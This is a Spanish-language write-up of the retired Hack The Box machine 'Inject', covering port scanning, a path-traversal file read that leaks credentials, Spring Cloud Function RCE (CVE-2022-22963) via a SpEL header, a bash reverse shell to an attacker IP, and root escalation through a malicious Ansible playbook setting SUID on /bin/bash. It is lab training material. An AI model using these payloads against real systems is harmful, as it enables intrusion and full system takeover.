---
title: Inject Writeup
author: d3vjh
date: 2023-07-14
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy, Web Enumeration, LFI, Directory Listing, Information Leakage, Spring Cloud Explotation, Abisng Cron Job, Malicious Ansible Playbook]
image: 
  path: /assets/img/commons/Inject/Inject.png
---

# Inject

Una máquina retirada, las cuales contempla un par de vulnerabilidades interesantes, entre ellas podemos destacar, el Spring Cloud Explotation

## Recopilación de Información

Iniciamos comprobando si tenemos comunicación con la máquina, enviando una traza `ICMP` a la `IP 10.10.11.204` 

```bash
❯ ping -c 1 10.10.11.204
PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
64 bytes from 10.10.11.204: icmp_seq=1 ttl=63 time=88.9 ms

--- 10.10.11.204 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 88.911/88.911/88.911/0.000 ms
```
{: .nolineno }

Ahora vamos a conocer los puertos que tiene abiertos la máquina, haciendo uso de la herramienta `Nmap` 

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.204 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 08:36 -05
Initiating SYN Stealth Scan at 08:36
Scanning 10.10.11.204 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.204
Discovered open port 22/tcp on 10.10.11.204
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 65.32% done; ETC: 08:36 (0:00:05 remaining)
Completed SYN Stealth Scan at 08:36, 13.61s elapsed (65535 total ports)
Nmap scan report for 10.10.11.204
Host is up, received user-set (0.089s latency).
Scanned at 2023-07-14 08:36:29 -05 for 13s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.80 seconds
           Raw packets sent: 67554 (2.972MB) | Rcvd: 67435 (2.697MB)
```
{: .nolineno }

Vemos que hay dos puertos abiertos, corriendo `SSH` por el puerto `22` y un servicio `HTTP` por el puerto `8080`

Ahora procedemos a enviar una serie de Scripts básicos de reconocimientos, que se enfocarán en estos dos puertos, haciendo uso de Nmap una vez más

```bash
❯ nmap -p22,8080 -sCV 10.10.11.204 -oN target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 08:40 -05
Nmap scan report for 10.10.11.204
Host is up (0.094s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.23 seconds
```
{: .nolineno }

## Análisis de Vulnerabilidades

Encontramos un apartado donde es posible subir imágenes

![Image Upload](/assets/img/commons/Inject/ImageUpload.png)

Podemos ver que se está cargando la imagen de esta manera:

```html
http://10.10.11.204:8080/show_image?img=Wallpaper.jpg
```
{: .nolineno }

Lo que nos hace pensar en un `Local File Inclusion (LFI)`

### Local File Inclusion + Directory Listing

Utilizando la herramienta `cURL` vamos a intentar mandar una petición por GET

```bash
❯ curl -X GET 'http://10.10.11.204:8080/show_image?img=../'
java
resources
uploads
curl: (18) transfer closed with 4073 bytes remaining to read
```
{: .nolineno }

Indagando un poco en la máquina, encontramos el archivo `pom.xml` en la ruta `http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/pom.xml`


![Pom.xml](/assets/img/commons/Inject/pom.xml.png)



Y observamos que está utilizando `Spring Boot`, y así mismo, `springframework.cloud`

### Information Leakage

También encotramos un archivo de configuración, con credenciales en texto claro, que posiblemente nos sirvan más adelante

```bash
❯ curl -X GET  'http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2'
settings.xml
```
{: .nolineno }

![Settings.xml](/assets/img/commons/Inject/settings.xml.png)


## Explotación de Vulnerabilidades

### Spring Cloud Exploitation (CVE-2022-22963) [Spring4Shell]
Encontramos la vulnerabilidad [CVE-2022-22963](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit) la cual permite que mediante el uso de las cabeceras, y por una petición por POST al servidor con una ruta especifica, nos da una ejecución remota de comandos (RCE)


```bash
curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 1 {Ip Attack}")' -d '.'
```
{: .nolineno }



Ahora, creamos un archivo llamado `index.html` el cual va a contener lo siguiente, un one linner que nos permitirá establecer una reverse shell

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.27/443 0>&1
```



Montamos un servidor por el puerto `80`, con `python3`, y nos compartimos este recurso, a su vez, nos colocamos en escucha por el puerto 443, debería verse algo así:

![Server & ReverseShell](/assets/img/commons/Inject/ServerReverseShell.png)



## Post Explotación

### Abusing Cron Job

Ahora vamos a revisar como podemos escalar privilegios, para ellos, vamos a ver que tareas se están enecutando

para ello hacemos uso de `ps -eo user,command` 

debemos estar haciendo comparaciones constantes, para ver que cambios ocurren a medida que corre el tiempo, para esto, hemos creado el siguiente script en bash:

```bash
#!/bin/bash

old_process=$(ps -oe user,command)

while true; do
  new_process=$(ps -eo user,command)
  diff <(echo "$old_process") <(echo "$new_process) | grep "[\>\<]" | grep -vE "procmon|kworker|command"
done

```


Con el fin de ver este proceso:

```bash
/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml

/bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks

/usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml

/usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
```
{: .nolineno }

Vemos que está ejecutando todo lo que encuentre en `/opt/automation/tasks/\*.yml`

Luego, borra todo lo que encuentre en la carpeta, reemplazadolo por un archivo que solo tiene acceso root

### Malicious Ansible Playbook

Tenemos acceso a escritura dentro de esta ruta, por lo tanto, vamos a crear un `playbook` malicioso, que nos permita asignarle permisos `SUID` a `/bin/bash`



```yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.shell: chmod u+s /bin/bash
```



Y esperamos a que se ejecute, recordemos que esto lo está ejecuntando `root`, y pasado un tiempo, comprobamos que `/bin/bash` ya cuenta con permisos `SUID` ahora solo tenemos que ejcutarla con privilegios

```bash
phil@inject:/opt/automation/tasks$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
phil@inject:/opt/automation/tasks$ bash -p
bash-5.0# whoami
root
bash-5.0# 
```
{: .nolineno }

![Inject Pwned!](/assets/img/commons/Inject/InjectPwned.png)
